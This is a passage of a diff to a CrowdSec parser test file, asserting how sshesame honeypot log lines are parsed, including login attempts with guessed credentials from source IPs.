+results["s00-raw"]["crowdsecurity/non-syslog"][105].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][105].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][106].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][106].Evt.Parsed["message"] == "WARNING 2022/04/16 21:12:15 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][106].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][106].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][106].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][107].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][107].Evt.Parsed["message"] == "WARNING 2022/04/16 21:12:28 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][107].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][107].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][107].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][108].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][108].Evt.Parsed["message"] == "WARNING 2022/04/16 21:13:07 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][108].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][108].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][108].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][109].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][109].Evt.Parsed["message"] == "WARNING 2022/04/16 21:17:29 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][109].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][109].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][109].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][110].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][110].Evt.Parsed["message"] == "WARNING 2022/04/16 21:18:07 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][110].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][110].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][110].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][111].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][111].Evt.Parsed["message"] == "WARNING 2022/04/16 21:22:29 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][111].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][111].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][111].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][112].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][112].Evt.Parsed["message"] == "WARNING 2022/04/16 21:23:08 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][112].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][112].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][112].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][113].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][113].Evt.Parsed["message"] == "WARNING 2022/04/16 21:27:30 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][113].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][113].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][113].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][114].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][114].Evt.Parsed["message"] == "WARNING 2022/04/16 21:28:09 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][114].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][114].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][114].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][115].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][115].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][115].Evt.Parsed["message"] == "WARNING 2022/04/16 21:32:30 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][115].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][115].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][116].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][116].Evt.Parsed["message"] == "WARNING 2022/04/16 21:33:09 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][116].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][116].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][116].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][117].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][117].Evt.Parsed["message"] == "WARNING 2022/04/16 21:37:31 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][117].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][117].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][117].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][118].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][118].Evt.Parsed["message"] == "WARNING 2022/04/16 21:38:11 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][118].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][118].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][118].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][119].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][119].Evt.Parsed["message"] == "WARNING 2022/04/16 21:42:31 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][119].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][119].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][119].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][120].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][120].Evt.Parsed["message"] == "WARNING 2022/04/16 21:43:11 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][120].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][120].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][120].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][121].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][121].Evt.Parsed["message"] == "WARNING 2022/04/16 21:47:32 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][121].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][121].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][121].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][122].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][122].Evt.Parsed["message"] == "WARNING 2022/04/16 21:48:12 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][122].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][122].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][122].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][123].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][123].Evt.Parsed["message"] == "WARNING 2022/04/16 21:52:32 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][123].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][123].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][123].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][124].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][124].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][124].Evt.Parsed["message"] == "WARNING 2022/04/16 21:53:12 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][124].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][124].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][125].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][125].Evt.Parsed["message"] == "WARNING 2022/04/16 21:57:33 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][125].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][125].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][125].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][126].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][126].Evt.Parsed["message"] == "WARNING 2022/04/16 21:58:13 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][126].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][126].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][126].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][127].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][127].Evt.Parsed["message"] == "2022/04/16 22:00:01 [164.77.39.94:51670] authentication for user \"fangdan\" with password \"fangdan123\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][127].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][127].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][127].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][128].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][128].Evt.Parsed["message"] == "2022/04/16 22:00:01 [164.77.39.94:51670] connection with client version \"SSH-2.0-libssh-0.6.3\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][128].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][128].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][128].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][129].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][129].Evt.Parsed["message"] == "2022/04/16 22:00:03 [164.77.39.94:51964] authentication for user \"nproc\" with password \"nproc\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][129].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][129].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][129].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][130].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][130].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][130].Evt.Parsed["message"] == "2022/04/16 22:00:03 [164.77.39.94:51964] connection with client version \"SSH-2.0-libssh-0.6.3\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][130].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][130].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][131].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][131].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][131].Evt.Parsed["message"] == "2022/04/16 22:00:03 [164.77.39.94:51670] [channel 0] session requested"
+results["s00-raw"]["crowdsecurity/non-syslog"][131].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][131].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][132].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][132].Evt.Parsed["message"] == "2022/04/16 22:00:03 [164.77.39.94:51964] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][132].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][132].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][132].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][133].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][133].Evt.Parsed["message"] == "2022/04/16 22:00:04 [164.77.39.94:51670] [channel 0] closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][133].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][133].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][133].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][134].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][134].Evt.Parsed["message"] == "2022/04/16 22:00:04 [164.77.39.94:51670] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][134].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][134].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][134].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][135].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][135].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][135].Evt.Parsed["message"] == "WARNING 2022/04/16 22:02:34 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][135].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][135].Evt.Meta["datasource_type"] == "file"
+len(results["s00-raw"]["crowdsecurity/syslog-logs"]) == 136
 results["s00-raw"]["crowdsecurity/syslog-logs"][0].Success == false
 results["s00-raw"]["crowdsecurity/syslog-logs"][1].Success == false
 results["s00-raw"]["crowdsecurity/syslog-logs"][2].Success == false
@@ -97,134 +697,1012 @@ results["s00-raw"]["crowdsecurity/syslog-logs"][12].Success == false
 results["s00-raw"]["crowdsecurity/syslog-logs"][13].Success == false
 results["s00-raw"]["crowdsecurity/syslog-logs"][14].Success == false
 results["s00-raw"]["crowdsecurity/syslog-logs"][15].Success == false
-len(results["s01-parse"]["thespad/sshesame-logs"]) == 16
+results["s00-raw"]["crowdsecurity/syslog-logs"][16].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][17].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][18].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][19].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][20].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][21].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][22].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][23].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][24].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][25].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][26].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][27].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][28].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][29].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][30].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][31].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][32].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][33].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][34].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][35].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][36].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][37].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][38].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][39].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][40].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][41].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][42].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][43].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][44].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][45].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][46].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][47].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][48].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][49].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][50].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][51].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][52].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][53].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][54].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][55].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][56].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][57].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][58].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][59].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][60].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][61].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][62].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][63].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][64].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][65].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][66].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][67].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][68].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][69].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][70].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][71].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][72].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][73].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][74].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][75].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][76].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][77].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][78].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][79].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][80].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][81].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][82].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][83].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][84].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][85].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][86].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][87].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][88].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][89].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][90].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][91].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][92].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][93].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][94].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][95].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][96].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][97].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][98].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][99].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][100].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][101].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][102].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][103].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][104].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][105].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][106].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][107].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][108].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][109].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][110].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][111].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][112].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][113].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][114].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][115].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][116].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][117].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][118].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][119].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][120].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][121].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][122].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][123].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][124].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][125].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][126].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][127].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][128].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][129].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][130].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][131].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][132].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][133].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][134].Success == false
+results["s00-raw"]["crowdsecurity/syslog-logs"][135].Success == false
+len(results["s01-parse"]["thespad/sshesame-logs"]) == 136
 results["s01-parse"]["thespad/sshesame-logs"][0].Success == false
-results["s01-parse"]["thespad/sshesame-logs"][1].Success == true
-results["s01-parse"]["thespad/sshesame-logs"][1].Evt.Parsed["program"] == "sshesame"
-results["s01-parse"]["thespad/sshesame-logs"][1].Evt.Parsed["source_ip"] == "164.77.39.94"
-results["s01-parse"]["thespad/sshesame-logs"][1].Evt.Parsed["sshesame_password"] == "fangdan123"
-results["s01-parse"]["thespad/sshesame-logs"][1].Evt.Parsed["sshesame_user"] == "fangdan"
-results["s01-parse"]["thespad/sshesame-logs"][1].Evt.Parsed["timestamp"] == "2022/04/16 22:00:01"
-results["s01-parse"]["thespad/sshesame-logs"][1].Evt.Parsed["message"] == "2022/04/16 22:00:01 [164.77.39.94:51670] authentication for user \"fangdan\" with password \"fangdan123\" accepted"
-results["s01-parse"]["thespad/sshesame-logs"][1].Evt.Meta["source_ip"] == "164.77.39.94"
-results["s01-parse"]["thespad/sshesame-logs"][1].Evt.Meta["target_user"] == "fangdan"
-results["s01-parse"]["thespad/sshesame-logs"][1].Evt.Meta["username"] == "fangdan"
-results["s01-parse"]["thespad/sshesame-logs"][1].Evt.Meta["datasource_path"] == "sshesame.log"
-results["s01-parse"]["thespad/sshesame-logs"][1].Evt.Meta["datasource_type"] == "file"
-results["s01-parse"]["thespad/sshesame-logs"][1].Evt.Meta["log_type"] == "sshesame_login"
-results["s01-parse"]["thespad/sshesame-logs"][1].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][1].Success == false
 results["s01-parse"]["thespad/sshesame-logs"][2].Success == false
-results["s01-parse"]["thespad/sshesame-logs"][3].Success == true
-results["s01-parse"]["thespad/sshesame-logs"][3].Evt.Parsed["source_ip"] == "164.77.39.94"
-results["s01-parse"]["thespad/sshesame-logs"][3].Evt.Parsed["sshesame_password"] == "nproc"
-results["s01-parse"]["thespad/sshesame-logs"][3].Evt.Parsed["sshesame_user"] == "nproc"
-results["s01-parse"]["thespad/sshesame-logs"][3].Evt.Parsed["timestamp"] == "2022/04/16 22:00:03"
-results["s01-parse"]["thespad/sshesame-logs"][3].Evt.Parsed["message"] == "2022/04/16 22:00:03 [164.77.39.94:51964] authentication for user \"nproc\" with password \"nproc\" accepted"
-results["s01-parse"]["thespad/sshesame-logs"][3].Evt.Parsed["program"] == "sshesame"
-results["s01-parse"]["thespad/sshesame-logs"][3].Evt.Meta["datasource_path"] == "sshesame.log"
-results["s01-parse"]["thespad/sshesame-logs"][3].Evt.Meta["datasource_type"] == "file"
-results["s01-parse"]["thespad/sshesame-logs"][3].Evt.Meta["log_type"] == "sshesame_login"
-results["s01-parse"]["thespad/sshesame-logs"][3].Evt.Meta["service"] == "sshesame"
-results["s01-parse"]["thespad/sshesame-logs"][3].Evt.Meta["source_ip"] == "164.77.39.94"
-results["s01-parse"]["thespad/sshesame-logs"][3].Evt.Meta["target_user"] == "nproc"
-results["s01-parse"]["thespad/sshesame-logs"][3].Evt.Meta["username"] == "nproc"
+results["s01-parse"]["thespad/sshesame-logs"][3].Success == false
 results["s01-parse"]["thespad/sshesame-logs"][4].Success == false
 results["s01-parse"]["thespad/sshesame-logs"][5].Success == false
 results["s01-parse"]["thespad/sshesame-logs"][6].Success == false
 results["s01-parse"]["thespad/sshesame-logs"][7].Success == false
-results["s01-parse"]["thespad/sshesame-logs"][8].Success == false
+results["s01-parse"]["thespad/sshesame-logs"][8].Success == true
+results["s01-parse"]["thespad/sshesame-logs"][8].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59114] authentication for user \"admin\" with password \"123\" accepted"
+results["s01-parse"]["thespad/sshesame-logs"][8].Evt.Parsed["program"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][8].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][8].Evt.Parsed["sshesame_password"] == "123"
+results["s01-parse"]["thespad/sshesame-logs"][8].Evt.Parsed["sshesame_user"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][8].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s01-parse"]["thespad/sshesame-logs"][8].Evt.Meta["log_type"] == "sshesame_login"
+results["s01-parse"]["thespad/sshesame-logs"][8].Evt.Meta["service"] == "sshesame"
+results["s01-parse"]["thespad/sshesame-logs"][8].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s01-parse"]["thespad/sshesame-logs"][8].Evt.Meta["target_user"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][8].Evt.Meta["username"] == "admin"
+results["s01-parse"]["thespad/sshesame-logs"][8].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s01-parse"]["thespad/sshesame-logs"][8].Evt.Meta["datasource_type"] == "file"
 results["s01-parse"]["thespad/sshesame-logs"][9].Success == false
 results["s01-parse"]["thespad/sshesame-logs"][10].Success == true
-results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Parsed["sshesame_user"] == "admin"
-results["s01-parse"]["thespad/sshesame-logs"][10].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
